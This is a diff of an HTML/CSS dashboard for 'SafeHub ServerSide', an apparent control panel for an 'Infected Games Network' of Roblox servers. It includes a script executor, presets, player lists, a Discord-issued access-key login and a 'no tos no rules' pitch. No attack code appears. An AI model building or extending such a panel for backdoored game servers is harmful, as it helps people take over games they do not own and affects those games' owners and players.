+    .sidebar-brand .sub { color: var(--text-dim); font-size: 0.75rem; font-weight: 500; margin-top: 0.15rem; }
+
+    .nav-section-label {
+      font-size: 0.65rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-dim);
+      padding: 0.5rem 0.85rem 0.25rem;
+      margin-top: 0.5rem;
+    }
+
+    .nav-item {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.7rem 0.85rem;
+      border-radius: 10px;
+      color: var(--text-secondary);
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-size: 0.9rem;
+      font-weight: 600;
+      margin-bottom: 0.2rem;
+      border: none;
+      background: none;
+      width: 100%;
+      text-align: left;
+      font-family: inherit;
+      position: relative;
+    }
+
+    .nav-item:hover { background: rgba(56, 189, 248, 0.08); color: var(--text); transform: translateX(4px); }
+
+    .nav-item.active {
+      background: linear-gradient(90deg, rgba(56, 189, 248, 0.12), transparent);
+      color: var(--accent);
+    }
+
+    .nav-item.active::before {
+      content: '';
+      position: absolute;
+      left: 0; top: 0.5rem; bottom: 0.5rem;
+      width: 3px;
+      background: var(--accent);
+      border-radius: 0 4px 4px 0;
+      box-shadow: 0 0 12px var(--accent-glow);
+    }
+
+    .nav-item .nav-icon { font-size: 1rem; flex-shrink: 0; width: 20px; text-align: center; }
+
+    .nav-item .count {
+      margin-left: auto;
+      background: var(--surface-2);
+      padding: 0.15rem 0.6rem;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: var(--text-dim);
+      border: 1px solid var(--border);
+      transition: all 0.3s ease;
+    }
+
+    .nav-item.active .count { background: rgba(56, 189, 248, 0.15); color: var(--accent); border-color: rgba(56, 189, 248, 0.2); }
+
+    .user-info {
+      margin-top: auto;
+      padding-top: 1rem;
+      border-top: 1px solid var(--border);
+    }
+
+    .user-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 0.75rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .user-avatar {
+      width: 36px; height: 36px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--accent), #2563eb);
+      display: grid;
+      place-items: center;
+      font-size: 0.85rem;
+      flex-shrink: 0;
+      font-weight: 800;
+    }
+
+    .user-name { font-size: 0.85rem; font-weight: 700; }
+    .user-roblox { font-size: 0.7rem; color: var(--text-secondary); margin-top: 0.1rem; }
+
+    .sidebar-footer {
+      font-size: 0.7rem;
+      color: var(--text-dim);
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    .sidebar-footer .status { color: var(--success); font-weight: 700; }
+
+    /* --- MAIN --- */
+    .main-content {
+      flex: 1;
+      padding: 2rem;
+      max-width: 1600px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    /* --- TOPBAR --- */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.875rem 1.5rem;
+      background: linear-gradient(180deg, rgba(15,23,42,0.85), rgba(15,23,42,0.65));
+      backdrop-filter: blur(16px);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      border-radius: var(--radius-sm);
+      margin-bottom: 1.5rem;
+      border: 1px solid var(--border);
+      transition: all 0.3s ease;
+    }
+
+    .topbar:hover { border-color: var(--border-strong); box-shadow: 0 10px 30px -10px rgba(0,0,0,0.3); }
+
+    .topbar-brand { display: flex; align-items: center; gap: 0.75rem; }
+    .topbar-brand h2 { font-size: 1.2rem; font-weight: 800; letter-spacing: -0.02em; }
+    .topbar-brand h2 span { color: var(--danger); }
+
+    .badge-top {
+      font-size: 0.6rem;
+      background: rgba(244, 63, 94, 0.1);
+      color: var(--danger);
+      padding: 0.2rem 0.6rem;
+      border-radius: 999px;
+      border: 1px solid rgba(244, 63, 94, 0.15);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .topbar-actions { display: flex; align-items: center; gap: 0.5rem; position: relative; }
+
+    .btn-icon {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      padding: 0.4rem;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 38px; height: 38px;
+    }
+
+    .btn-icon:hover { background: rgba(255,255,255,0.06); color: var(--text); transform: translateY(-2px); }
+
+    .hamburger {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      cursor: pointer;
+      padding: 6px;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+      background: none;
+      border: none;
+    }
+
+    .hamburger:hover { background: rgba(255,255,255,0.06); transform: scale(1.05); }
+    .hamburger span { display: block; width: 20px; height: 2.5px; background: var(--text-secondary); border-radius: 2px; transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
+    .hamburger.active span:nth-child(1) { transform: rotate(45deg) translate(4px, 4px); }
+    .hamburger.active span:nth-child(2) { opacity: 0; transform: scaleX(0); }
+    .hamburger.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+    /* Menu Dropdown */
+    .menu-dropdown {
+      position: absolute;
+      top: calc(100% + 0.75rem);
+      right: 0;
+      width: 230px;
+      background: linear-gradient(180deg, rgba(17,26,46,0.98), rgba(11,18,33,0.98));
+      border: 1px solid var(--border-strong);
+      border-radius: var(--radius-sm);
+      padding: 0.75rem;
+      z-index: 60;
+      opacity: 0;
+      transform: translateY(-10px) scale(0.96);
+      pointer-events: none;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      box-shadow: 0 20px 40px -10px rgba(0,0,0,0.5);
+      backdrop-filter: blur(20px);
+    }
+
+    .menu-dropdown.open { opacity: 1; transform: translateY(0) scale(1); pointer-events: all; }
+
+    .menu-dropdown::before {
+      content: '';
+      position: absolute;
+      top: -1px; left: 0; right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent), transparent);
+      opacity: 0.6;
+    }
+
+    .menu-item {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      width: 100%;
+      padding: 0.65rem 0.75rem;
+      border-radius: 8px;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: none;
+      background: none;
+      text-align: left;
+      font-family: inherit;
+    }
+
+    .menu-item:hover { background: rgba(56, 189, 248, 0.08); color: var(--text); }
+    .menu-item.danger { color: var(--danger); }
+    .menu-item.danger:hover { background: rgba(244, 63, 94, 0.08); }
+    .menu-divider { height: 1px; background: var(--border); margin: 0.5rem 0; }
+
+    /* --- STATS --- */
+    .stats-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin-bottom: 2rem;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .stats-group { display: flex; gap: 1rem; flex-wrap: wrap; }
+
+    .stat-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      background: linear-gradient(180deg, var(--surface), rgba(11,18,33,0.6));
+      padding: 0.6rem 1.25rem;
+      border-radius: var(--radius-sm);
+      border: 1px solid var(--border);
+      font-weight: 500;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(10px);
+    }
+
+    .stat-item:hover { transform: translateY(-2px); border-color: var(--border-strong); box-shadow: 0 8px 16px -4px rgba(0,0,0,0.3); }
+    .stat-item .num { color: var(--text); font-weight: 800; font-size: 1.15rem; }
+    .last-update { font-size: 0.8rem; color: var(--text-dim); font-weight: 500; }
+
+    /* --- PAGES --- */
+    .page { display: none; animation: fadeIn 0.4s cubic-bezier(0.4,0,0.2,1); }
+    .page.active { display: block; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .section-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      margin-bottom: 1.25rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--text-secondary);
+    }
+
+    .section-title .count {
+      color: var(--text-dim);
+      font-weight: 600;
+      font-size: 0.85rem;
+      background: var(--surface);
+      padding: 0.3rem 0.85rem;
+      border-radius: 999px;
+      border: 1px solid var(--border);
+    }
+
+    /* --- GRID & CARDS --- */
+    .grid { display: grid; grid-template-columns: 1fr; gap: 1.25rem; }
+
+    .server-card {
+      background: linear-gradient(180deg, rgba(17,26,46,0.85), rgba(11,18,33,0.7));
+      border-radius: var(--radius-sm);
+      padding: 1.25rem;
+      border: 1px solid var(--border);
+      transition: all 0.4s cubic-bezier(0.4,0,0.2,1);
+      position: relative;
+      overflow: hidden;
+      backdrop-filter: blur(12px);
+    }
+
+    .server-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      padding: 1px;
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), transparent 50%);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      pointer-events: none;
+      opacity: 0.6;
+      transition: opacity 0.3s ease;
+    }
+
+    .server-card:hover { transform: translateY(-4px); border-color: rgba(148,163,184,0.2); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+    .server-card:hover::before { opacity: 1; }
+    .server-card.online { border-left: 3px solid var(--success); }
+    .server-card.offline { border-left: 3px solid var(--danger); opacity: 0.75; }
+    .server-card.shutting-down { border-left: 3px solid var(--warning); }
+
+    .card-header { display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 0.75rem; margin-bottom: 0.75rem; }
+    .game-name { font-size: 1.05rem; font-weight: 700; color: var(--text); letter-spacing: -0.01em; }
+    .game-name .tag { font-size: 0.6rem; font-weight: 800; color: var(--danger); background: rgba(244,63,94,0.1); padding: 0.15rem 0.5rem; border-radius: 999px; border: 1px solid rgba(244,63,94,0.15); margin-left: 0.4rem; text-transform: uppercase; letter-spacing: 0.05em; vertical-align: middle; }
+    .server-name { font-size: 0.8rem; color: var(--text-secondary); font-weight: 500; margin-top: 0.15rem; }
+
+    .status-badge { display: inline-flex; align-items: center; gap: 0.4rem; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; padding: 0.3rem 0.75rem; border-radius: 999px; letter-spacing: 0.05em; border: 1px solid transparent; }
+    .status-badge.online { color: var(--success); background: rgba(34,197,94,0.08); border-color: rgba(34,197,94,0.15); }
+    .status-badge.offline { color: var(--danger); background: rgba(244,63,94,0.08); border-color: rgba(244,63,94,0.15); }
+    .status-badge.shutting-down { color: var(--warning); background: rgba(245,158,11,0.08); border-color: rgba(245,158,11,0.15); }
+
+    .status-dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; }
+    .status-dot.online { background: var(--success); box-shadow: 0 0 8px var(--success-glow); animation: pulse-dot 2s infinite; }
+    .status-dot.offline { background: var(--danger); }
+    .status-dot.shutting-down { background: var(--warning); box-shadow: 0 0 8px var(--warning-glow); animation: pulse-dot 1s infinite; }
+
+    .details-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.75rem; margin-top: 0.75rem; padding-top: 0.75rem; border-top: 1px solid var(--border); }
+    .detail-item .label { font-size: 0.6rem; text-transform: uppercase; color: var(--text-dim); letter-spacing: 0.08em; font-weight: 700; margin-bottom: 0.2rem; }
+    .detail-item .value { font-size: 0.85rem; font-weight: 600; color: var(--text); }
+    .detail-item .value .sub { color: var(--text-dim); font-weight: 500; font-size: 0.75rem; }
+
+    .player-list { margin-top: 0.75rem; padding-top: 0.75rem; border-top: 1px solid var(--border); }
+    .player-list .title { font-size: 0.6rem; text-transform: uppercase; color: var(--text-dim); letter-spacing: 0.08em; font-weight: 700; margin-bottom: 0.5rem; }
+    .player-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; }
+
+    .player-tag {
+      background: var(--surface-2);
+      color: var(--text-secondary);
+      padding: 0.25rem 0.75rem;
+      border-radius: 999px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      border: 1px solid var(--border);
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      user-select: none;
+    }
+
+    .player-tag:hover { background: var(--surface-3); color: var(--text); border-color: var(--border-strong); transform: translateY(-1px); }
+    .player-tag.selected { background: linear-gradient(135deg, #2563eb, var(--accent)); border-color: transparent; color: #fff; box-shadow: 0 4px 16px rgba(37,99,235,0.3); }
+
+    .card-actions { display: flex; gap: 0.5rem; margin-top: 0.75rem; padding-top: 0.75rem; border-top: 1px solid var(--border); flex-wrap: wrap; }
+    .card-actions .btn-sm { flex: 1; text-align: center; min-width: 60px; }
+
+    /* --- EMPTY STATE --- */
+    .empty-state {
+      text-align: center;
+      padding: 5rem 2rem;
+      color: var(--text-dim);
+      background: linear-gradient(180deg, rgba(17,26,46,0.6), rgba(11,18,33,0.4));
+      border-radius: var(--radius-sm);
+      border: 1px dashed var(--border);
+      backdrop-filter: blur(10px);
+      transition: all 0.4s ease;
+    }
+
+    .empty-state:hover { border-color: var(--border-strong); }
+    .empty-state .icon { font-size: 4rem; opacity: 0.4; margin-bottom: 1.25rem; display: block; filter: drop-shadow(0 0 20px rgba(56,189,248,0.2)); }
+    .empty-state h3 { color: var(--text-secondary); font-weight: 700; font-size: 1.5rem; margin-bottom: 0.5rem; letter-spacing: -0.01em; }
+    .empty-state p { font-size: 1rem; color: var(--text-dim); max-width: 400px; margin: 0 auto; line-height: 1.5; }
+
+    /* ========================================================
+       MAIN GRID
+       ======================================================== */
+    .main-grid { display: block; }
+
+    .commands-executor-layout {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1.5rem;
+    }
+
+    /* --- COMMANDS PANEL --- */
+    .commands-panel {
+      background: linear-gradient(180deg, rgba(17,26,46,0.9), rgba(11,18,33,0.75));
+      border-radius: var(--radius-sm);
+      padding: 1.75rem;
+      border: 1px solid var(--border);
+      backdrop-filter: blur(16px);
+      transition: all 0.3s ease;
+    }
+
+    .commands-panel:hover { border-color: var(--border-strong); box-shadow: 0 20px 40px -10px rgba(0,0,0,0.4); }
+    .commands-panel .panel-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 0.35rem; letter-spacing: -0.01em; }
+    .commands-panel .panel-subtitle { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem; font-weight: 500; }
+
+    .command-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1.25rem; }
+    .command-buttons .btn-sm { padding: 0.65rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.03em; font-weight: 700; }
+    .command-buttons .full { grid-column: 1 / -1; }
+
+    /* ========================================================
+       EXECUTOR
+       ======================================================== */
+    .executor-panel {
+      background: linear-gradient(180deg, rgba(17,26,46,0.9), rgba(11,18,33,0.75));
+      border-radius: var(--radius-sm);
+      padding: 1.75rem;
+      border: 1px solid var(--border);
+      backdrop-filter: blur(16px);
+      transition: all 0.3s ease;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .executor-panel:hover { border-color: var(--border-strong); box-shadow: 0 20px 40px -10px rgba(0,0,0,0.4); }
+
+    .executor-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+    }
+
+    .executor-title { font-size: 1.2rem; font-weight: 700; letter-spacing: -0.01em; }
+    .executor-sub { color: var(--text-secondary); font-size: 0.9rem; font-weight: 500; margin-top: 0.15rem; }
+
+    .executor-tab-bar {
+      display: flex;
+      gap: 0.4rem;
+      margin-bottom: 1rem;
+      background: rgba(2, 6, 23, 0.4);
+      border-radius: 10px;
+      padding: 0.35rem;
+      border: 1px solid var(--border);
+    }
+
+    .executor-tab {
+      flex: 1;
+      padding: 0.5rem 0.75rem;
+      border-radius: 8px;
+      border: none;
+      background: transparent;
+      color: var(--text-secondary);
+      font-size: 0.8rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      text-align: center;
+    }
+
+    .executor-tab:hover { color: var(--text); }
+    .executor-tab.active { background: var(--surface-2); color: var(--text); box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+
+    .executor-textarea {
+      width: 100%;
+      min-height: 200px;
+      background: rgba(2, 6, 23, 0.7);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: #7dd3fc;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      padding: 1rem;
+      resize: vertical;
+      transition: all 0.3s ease;
+      outline: none;
+      flex: 1;
+    }
+
+    .executor-textarea:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 4px var(--accent-glow);
+    }
+
+    .executor-textarea::placeholder { color: var(--text-dim); }
+
+    .executor-actions {
+      display: flex;
+      gap: 0.75rem;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .executor-actions .btn-sm { flex: 1; text-align: center; padding: 0.65rem; font-size: 0.85rem; font-weight: 700; }
+
+    /* Script Presets */
+    .preset-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 0.75rem;
+      margin-top: 0.75rem;
+    }
+
+    .preset-card {
+      background: rgba(2, 6, 23, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1rem 1.1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      cursor: default;
+    }
+
+    .preset-card:hover {
+      border-color: var(--border-strong);
+      background: rgba(56, 189, 248, 0.04);
+      transform: translateX(4px);
+    }
+
+    .preset-info { flex: 1; min-width: 0; }
+    .preset-name { font-size: 0.9rem; font-weight: 700; margin-bottom: 0.2rem; }
+    .preset-desc { font-size: 0.75rem; color: var(--text-secondary); }
+    .preset-tag {
+      font-size: 0.6rem;
+      font-weight: 700;
+      padding: 0.15rem 0.55rem;
+      border-radius: 999px;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .preset-tag.red { background: rgba(244,63,94,0.12); color: var(--danger); border: 1px solid rgba(244,63,94,0.2); }
+    .preset-tag.blue { background: rgba(56,189,248,0.12); color: var(--accent); border: 1px solid rgba(56,189,248,0.2); }
+    .preset-tag.green { background: rgba(34,197,94,0.12); color: var(--success); border: 1px solid rgba(34,197,94,0.2); }
+    .preset-tag.orange { background: rgba(245,158,11,0.12); color: var(--warning); border: 1px solid rgba(245,158,11,0.2); }
+
+    .preset-btns { display: flex; gap: 0.4rem; flex-shrink: 0; }
+
+    /* ========================================================
+       SETTINGS
+       ======================================================== */
+    .settings-grid { display: grid; grid-template-columns: 1fr; gap: 1.25rem; }
+
+    .settings-card {
+      background: linear-gradient(180deg, rgba(17,26,46,0.85), rgba(11,18,33,0.7));
+      border-radius: var(--radius-sm);
+      padding: 1.5rem;
+      border: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+      transition: all 0.4s cubic-bezier(0.4,0,0.2,1);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .settings-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      padding: 1px;
+      background: linear-gradient(135deg, rgba(255,255,255,0.08), transparent 40%);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      pointer-events: none;
+      opacity: 0.6;
+    }
+
+    .settings-card:hover { transform: translateY(-4px); border-color: rgba(148,163,184,0.2); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+    .settings-label { font-size: 1.15rem; font-weight: 700; margin-bottom: 1.25rem; letter-spacing: -0.01em; color: var(--text); }
+
+    .color-picker { display: flex; gap: 0.875rem; flex-wrap: wrap; margin-top: 0.5rem; }
+
+    .color-btn {
+      width: 40px; height: 40px;
+      border-radius: 50%;
+      border: 2px solid transparent;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    .color-btn:hover { transform: scale(1.2); }
+    .color-btn.active { border-color: #fff; box-shadow: 0 0 0 3px var(--accent), 0 8px 20px rgba(0,0,0,0.4); }
+
+    .toggle-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 600;
+      margin-top: 0.25rem;
+    }
+
+    .toggle-label input { display: none; }
+
+    .toggle-slider {
+      width: 48px; height: 26px;
+      background: var(--surface-3);
+      border-radius: 999px;
+      position: relative;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      border: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .toggle-slider::before {
+      content: '';
+      position: absolute;
+      width: 20px; height: 20px;
+      background: var(--text-secondary);
+      border-radius: 50%;
+      top: 2px; left: 2px;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    }
+
+    .toggle-label input:checked + .toggle-slider { background: var(--accent); border-color: var(--accent); }
+    .toggle-label input:checked + .toggle-slider::before { transform: translateX(22px); background: #fff; }
+
+    .danger-zone { border-color: rgba(244,63,94,0.2) !important; }
+    .danger-zone:hover { border-color: rgba(244,63,94,0.4) !important; box-shadow: 0 25px 50px -12px rgba(244,63,94,0.15) !important; }
+
+    /* --- MODAL --- */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(12px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 200;
+      padding: 1rem;
+    }
+
+    .modal-overlay.active { display: flex; }
+
+    .modal {
+      background: linear-gradient(180deg, var(--surface-2), var(--surface));
+      padding: 2.5rem;
+      border-radius: var(--radius);
+      border: 1px solid var(--border-strong);
+      max-width: 440px;
+      width: 100%;
+      text-align: center;
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+      animation: modalIn 0.4s cubic-bezier(0.4,0,0.2,1);
+    }
+
+    @keyframes modalIn {
+      from { opacity: 0; transform: scale(0.9) translateY(20px); }
+      to { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    .modal::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, var(--warning), transparent); }
+    .modal h2 { color: var(--warning); font-size: 1.5rem; margin-bottom: 0.75rem; font-weight: 800; }
+    .modal p { color: var(--text-secondary); font-size: 1rem; line-height: 1.6; margin-bottom: 2rem; }
+
+    /* --- FOOTER --- */
+    .footer-bar { text-align: center; color: var(--text-dim); font-size: 0.75rem; padding: 1.5rem; border-top: 1px solid var(--border); margin-top: 2.5rem; font-weight: 500; }
+
+    /* --- BODY MODIFIERS --- */
+    body.no-animations * { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+    body.no-glass .server-card, body.no-glass .commands-panel, body.no-glass .executor-panel, body.no-glass .topbar, body.no-glass .sidebar { backdrop-filter: none !important; }
+    body.compact-mode .server-card { padding: 0.875rem; }
+    body.compact-mode .details-grid { gap: 0.5rem; }
+
+    /* ========================================================
+       RESPONSIVE
+       ======================================================== */
+    @media (min-width: 768px) {
+      .main-content { padding: 2rem; max-width: 1600px; }
+      .sidebar { left: 0; width: 260px; position: sticky; top: 0; height: 100vh; }
+      .sidebar-overlay { display: none !important; }
+      .dashboard { flex-direction: row; }
+      .hamburger-mobile { display: none; }
+      .grid { grid-template-columns: repeat(2, 1fr); }
+      .details-grid { grid-template-columns: repeat(3, 1fr); }
+      .commands-executor-layout { grid-template-columns: 1fr 1fr; }
+      .settings-grid { grid-template-columns: repeat(2, 1fr); }
+      .preset-grid { grid-template-columns: 1fr; }
+    }
+
+    @media (min-width: 1200px) {
+      .main-content { padding: 2.5rem; }
+    }
+
+    @media (max-width: 767px) {
+      .topbar { padding: 0.6rem 0.875rem; margin-bottom: 1rem; }
+      .main-content { padding: 0.875rem; }
+      .stats-row { flex-direction: column; align-items: stretch; gap: 0.75rem; }
+      .stats-group { justify-content: space-between; }
+      .commands-executor-layout { grid-template-columns: 1fr; }
+      .settings-grid { grid-template-columns: 1fr; }
+      .card-actions .btn-sm { flex: 1 1 40%; }
+      .command-buttons { grid-template-columns: 1fr 1fr; }
+      .menu-dropdown { right: 0; width: 200px; }
+      .landing-nav { padding: 1rem; }
+      .hero-title { font-size: 2.2rem; }
+    }
+  </style>
 </head>
 <body>
-    <!-- Key Expiry Modal -->
-    <div class="modal-overlay" id="keyExpiryModal">
-        <div class="modal">
-            <h2>⏰ Key Expired</h2>
-            <p>Your access key has expired. Please generate a new key using the Discord bot and log in again.</p>
-            <button class="btn btn-primary" onclick="logout()">Logout & Get New Key</button>
-        </div>
+
+  <!-- Ambient Background -->
+  <div class="ambient-glow"></div>
+
+  <!-- ========================================================
+       LANDING PAGE
+       ======================================================== -->
+  <div class="landing-page" id="landingPage">
+    <nav class="landing-nav">
+      <div class="landing-logo">Safe<span>Hub</span></div>
+      <div class="landing-nav-btns">
+        <button class="btn-sm" onclick="openAuth('login')">Log In</button>
+        <button class="btn-sm primary" onclick="openAuth('register')">Sign Up</button>
+      </div>
+    </nav>
+
+    <div class="landing-hero">
+      <div class="hero-eyebrow">
+        <div class="dot"></div>
+        external & internal serverside!
+      </div>
+      <h1 class="hero-title">Welcome To<br><span>Safe Hub ServerSide</span></h1>
+      <p class="hero-sub">#1 Best private ServerSide made!.</p>
+      <div class="hero-btns">
+        <button class="btn-hero-primary" onclick="openAuth('register')">Get Started Free</button>
+        <button class="btn-hero-ghost" onclick="openAuth('login')">Log in</button>
+      </div>
+      <div class="hero-features">
+        <div class="hero-feature"><div class="check">✓</div> secure</div>
+        <div class="hero-feature"><div class="check">✓</div> better</div>
+        <div class="hero-feature"><div class="check">✓</div> faster</div>
+        <div class="hero-feature"><div class="check">✓</div> Key-Based Access</div>
+        <div class="hero-feature"><div class="check">✓</div> best free no tos no rules serverside with a internal and external support!</div>
+      </div>
     </div>
+  </div>
 
-    <div class="sidebar">
-        <div class="sidebar-brand">
-            <h2>Safe<span>Hub</span></h2>
-            <div class="sub">Infected Games Network</div>
-            <div class="badge-side">Command Center</div>
+  <!-- ========================================================
+       AUTH OVERLAY
+       ======================================================== -->
+  <div class="auth-overlay" id="authOverlay">
+    <div class="auth-box">
+      <button class="auth-close" onclick="closeAuth()">✕</button>
+
+      <!-- LOGIN PANEL -->
+      <div id="authLogin">
+        <div class="auth-title">Safe<span>Hub</span></div>
+        <div class="auth-sub">Sign in to access your Command Center</div>
+
+        <div id="loginStatus" class="status-msg"></div>
+
+        <div class="form-group">
+          <label for="keyInput">Access Key</label>
+          <input type="password" id="keyInput" placeholder="Enter your access key..." autocomplete="off">
         </div>
 
-        <div class="nav-items">
-            <div class="nav-item active" onclick="switchPage('servers')" id="nav-servers">
-                <span class="icon">🖥️</span>
-                <span>Servers</span>
-                <span class="count" id="navServerCount">0</span>
+        <button class="btn-sm primary btn-full" id="loginBtn" onclick="validateKey()">Access Dashboard</button>
+
+        <div class="roblox-link-section">
+          <div class="roblox-link-title">Link Roblox Account (Optional)</div>
+          <div class="roblox-input-row">
+            <div class="form-group" style="flex:1;margin-bottom:0;">
+              <input type="text" id="robloxUsernameInput" placeholder="Your Roblox username...">
             </div>
-            <div class="nav-item" onclick="switchPage('players')" id="nav-players">
-                <span class="icon">👤</span>
-                <span>Players</span>
-                <span class="count" id="navPlayerCount">0</span>
+            <button class="btn-sm primary" onclick="linkRoblox()" style="white-space:nowrap;padding:0.75rem 1rem;">Link</button>
+          </div>
+          <div id="robloxPreview" style="display:none" class="roblox-avatar">
+            <div class="roblox-avatar-icon">🎮</div>
+            <div>
+              <div class="roblox-avatar-name" id="robloxAvatarName"></div>
+              <div class="roblox-avatar-sub">Roblox Account Linked ✓</div>
             </div>
-            <div class="nav-item" onclick="switchPage('commands')" id="nav-commands">
-                <span class="icon">⚡</span>
-                <span>Commands</span>
-            </div>
+          </div>
         </div>
 
-        <div class="nav-divider"></div>
+        <div style="text-align:center;margin-top:1rem;font-size:0.8rem;color:var(--text-dim);">
+          No account? <span style="color:var(--accent);cursor:pointer;font-weight:600;" onclick="switchAuth('register')">Get a key</span>
+        </div>
+      </div>
 
+      <!-- REGISTER PANEL -->
+      <div id="authRegister" style="display:none;">
+        <div class="auth-title">Get <span>Access</span></div>
+        <div class="auth-sub">Join the Infected Games Network</div>
+        <div style="background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.15);border-radius:12px;padding:1.25rem;text-align:center;">
+          <div style="font-size:2rem;margin-bottom:0.5rem;">🤖</div>
+          <div style="font-weight:700;margin-bottom:0.35rem;">Join our Discord</div>
+          <div style="font-size:0.85rem;color:var(--text-secondary);margin-bottom:1rem;">Use our Discord bot to generate your personal access key.</div>
+          <button class="btn-sm primary" onclick="window.open('https://discord.gg/FmwcYgJpuy', '_blank')">Join Our Discord</button>
+        </div>
+        <div style="text-align:center;margin-top:1rem;font-size:0.8rem;color:var(--text-dim);">
+          Already have a key? <span style="color:var(--accent);cursor:pointer;font-weight:600;" onclick="switchAuth('login')">Sign in</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ====== KEY EXPIRY MODAL ====== -->
+  <div class="modal-overlay" id="keyExpiryModal">
+    <div class="modal">
+      <h2>Key Expired</h2>
+      <p>Your access key has expired. Please generate a new key using the Discord bot and log in again.</p>
